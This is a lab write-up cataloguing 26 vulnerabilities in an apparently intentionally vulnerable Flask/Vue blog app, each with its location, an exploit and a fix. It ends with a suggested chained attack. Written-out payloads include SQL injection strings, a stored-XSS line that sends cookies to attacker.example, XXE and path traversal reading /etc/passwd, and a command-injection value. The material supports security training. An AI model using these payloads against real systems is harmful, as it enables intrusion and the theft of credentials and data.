# VulnBlog — Vulnerability Writeup

Lab use only. Each entry: **what → where → exploit → fix.**

---

## 1. SQL Injection — Login bypass
**Where:** `backend/app/routes/auth.py` → `POST /api/auth/login`
**Exploit:**
```bash
curl -X POST http://localhost:8081/api/auth/login -H "Content-Type: application/json" \
  -d "{\"username\":\"admin' -- \",\"password\":\"x\"}"
```
**Fix:** Parameterized queries via `cursor.execute(sql, params)`, never f-strings into SQL.

---

## 2. SQL Injection — Post search (UNION exfiltration)
**Where:** `backend/app/routes/posts.py` → `GET /api/posts/search`
**Exploit:** `?q=x' UNION SELECT id,username,password,role,NULL,NULL,NULL FROM users --`
**Fix:** Parameterize; match column counts carefully only matters to the attacker, not you — just stop building SQL from strings.

---

## 3. SQL Injection — Admin PATCH & draft loader
**Where:** `backend/app/routes/admin.py` (`update_user`), `backend/app/routes/tools.py` (`load_draft`)
**Fix:** Same as above — parameterize every query, including ones that look "internal-only."

---

## 4. Mass Assignment → Privilege Escalation
**Where:** `backend/app/routes/auth.py` → `POST /api/auth/register`
**Exploit:** `{"username":"h4x","email":"h@x.com","password":"pw","role":"admin"}`
**Fix:** Whitelist settable fields server-side; never trust `role` from self-registration.

---

## 5. Broken Access Control — Admin role update
**Where:** `backend/app/routes/admin.py` → `PATCH /api/admin/users/:id` (missing `@require_admin`)
**Fix:** Add `@require_admin`; add a test that asserts every `/admin/*` route carries it.

---

## 6. Broken Access Control — Delete any post
**Where:** `backend/app/routes/posts.py` → `DELETE /api/posts/:id`
**Fix:** Check `post.user_id == request.user.id` or require admin.

---

## 7. Broken JWT — "none" algorithm accepted + no expiry
**Where:** `backend/app/auth_utils.py`
**Exploit:** Forge `{"alg":"none"}` header + arbitrary payload, no signature, server accepts it. Tokens also never expire once issued.
**Fix:** `algorithms=["HS256"]` only; always set and check an `exp` claim.

---

## 8. Weak, hardcoded Flask `SECRET_KEY`
**Where:** `backend/app/__init__.py` / `docker-compose.yml` (`SECRET_KEY=changeme`)
**Fix:** Random, long secret from a vault, rotated, never committed.

---

## 9. Weak password hashing (unsalted SHA1)
**Where:** `backend/app/auth_utils.py` (`sha1()`), `init.sql`
**Fix:** bcrypt/argon2 with per-user salt.

---

## 10. Predictable password-reset tokens, returned in the API response
**Where:** `backend/app/routes/auth.py` → `/forgot-password`
**Bug:** 4-digit numeric token from `random` (not `secrets`), and handed straight back to the caller instead of only being emailed.
**Exploit:** Brute-force 10,000 possibilities, or just read it from the response since it's returned directly.
**Fix:** Use `secrets.token_urlsafe()`, never return the token in the API response, email it instead, expire it quickly.

---

## 11. Flask debug mode enabled (RCE via Werkzeug debugger)
**Where:** `backend/run.py`, `backend/app/__init__.py` (`debug=True` everywhere, no env gating)
**Exploit:** Trigger any unhandled exception → Werkzeug's interactive debugger appears in the browser; if the debugger PIN can be derived (it's computed from semi-guessable machine/app values), an attacker gets a Python shell on the server.
**Fix:** Never run `debug=True` outside local dev; gate it strictly behind an environment check that defaults to off.

---

## 12. No rate limiting — brute force
**Where:** `/api/auth/login`
**Fix:** `Flask-Limiter` + lockout/backoff.

---

## 13. Stored XSS — Post body & comments
**Where:** No sanitization in `routes/posts.py` / `routes/comments.py`; rendered via `v-html` in `PostDetail.vue`.
**Exploit:** Post/comment body: `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`
**Fix:** Sanitize on write (e.g. `bleach`) and/or avoid `v-html`, render as text.

---

## 14. Reflected XSS — Search page
**Where:** `routes/posts.py` (`search_posts` echoes raw `q`) + `Search.vue` (`v-html`)
**Exploit:** `?q=<img src=x onerror=alert(document.cookie)>`
**Fix:** Never reflect raw input into HTML.

---

## 15. Arbitrary File Upload
**Where:** `backend/app/routes/upload.py`
**Exploit:** Upload `shell.html` with embedded `<script>`, visit `/uploads/shell.html` directly.
**Fix:** Allow-list extensions, randomize stored filenames, serve with `Content-Disposition: attachment`.

---

## 16. Path Traversal — File read endpoint
**Where:** `backend/app/routes/files.py` → `GET /api/files?name=`
**Exploit:** `?name=../../../../../../etc/passwd`
**Fix:** `os.path.realpath` + verify it's still inside the uploads directory before opening.

---

## 17. SSRF — Link preview
**Where:** `backend/app/routes/tools.py` → `POST /api/tools/link-preview`
**Exploit:** `{"url":"http://db:3306"}` or a cloud metadata address to probe internal services.
**Fix:** Allow-list schemes/hosts, block private/link-local IP ranges, resolve-then-check the IP (not just the hostname) to avoid DNS-rebinding bypasses.

---

## 18. Insecure Deserialization — `pickle` drafts (RCE)
**Where:** `backend/app/routes/tools.py` → `/api/tools/draft` (save) and `/api/tools/draft/:id` (load)
**Exploit:** Craft a malicious pickle payload (e.g. with a `__reduce__` method that runs a shell command), base64-encode it, store it as "draft data," then load it — code executes on the server the instant `pickle.loads()` runs.
**Fix:** Never unpickle untrusted data. Use JSON for anything that touches user input.

---

## 19. XXE — XML import
**Where:** `backend/app/routes/tools.py` → `POST /api/tools/import-xml`
**Exploit:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<post><title>&xxe;</title></post>
```
**Fix:** `etree.XMLParser(resolve_entities=False, no_network=True)`, or use `defusedxml`.

---

## 20. Command Injection — PDF export
**Where:** `backend/app/routes/tools.py` → `/api/tools/export/<post_id>/pdf` (`subprocess.check_output(..., shell=True)`)
**Exploit:** `post_id = "1; cat /etc/passwd"` (or `&&`, `|`, backticks)
**Fix:** `shell=False` with an argument list, and validate `post_id` is an integer first.

---

## 21. Sensitive Data Exposure — Admin users endpoint
**Where:** `backend/app/routes/admin.py` → `GET /api/admin/users`
**Fix:** Select only needed columns; never return password hashes or reset tokens.

---

## 22. Verbose errors / internal detail leaked
**Where:** Several routes echo `str(e)`, the executed SQL, or the executed shell command back to the client; Flask debug mode (#11) does this app-wide too.
**Fix:** Log server-side only, return generic client-facing errors.

---

## 23. Insecure CORS
**Where:** `backend/app/__init__.py` (`CORS(app, supports_credentials=True, origins="*")`)
**Fix:** Allow-list specific origins; never pair `*`/reflected origin with credentials.

---

## 24. Open Redirect
**Where:** `/api/auth/post-login-redirect?redirect=`
**Fix:** Allow-list relative paths only.

---

## 25. Insecure cookie flags
**Where:** `backend/app/routes/auth.py` (`httponly=False, secure=False, samesite=None`)
**Fix:** `httponly=True`, `secure=True` over HTTPS, `samesite="Strict"`/`"Lax"`.

---

## 26. Apache misconfiguration bundle
**Where:** `apache/httpd.conf`
- `ServerTokens Full` / `ServerSignature On` → version fingerprinting
- `TraceEnable On` → Cross-Site Tracing (XST)
- `/server-status` exposed with `Require all granted` → leaks internal server state
- `Options +Indexes` on `/uploads` → directory listing
- `/internal/` proxies straight to the admin API with no auth at the proxy layer
- No security headers anywhere (CSP, X-Frame-Options, HSTS, X-Content-Type-Options)
**Fix:** `ServerTokens Prod`, `ServerSignature Off`, `TraceEnable Off`, restrict/remove `/server-status`, disable `Indexes`, remove the `/internal/` alias, add standard security headers via `mod_headers`.

---

## Suggested chained attack
1. **Mass assignment (#4)** → register as `role: admin`, or just **SQLi login bypass (#1)** into the real admin.
2. **Pickle RCE (#18)** on the drafts endpoint for a straight shell on the backend container.
3. Alternatively: trip an unhandled exception to surface the **Werkzeug debugger (#11)** and go from there.
4. From a backend shell, pivot to **SSRF (#17)** targets or read `/app` source/secrets directly.
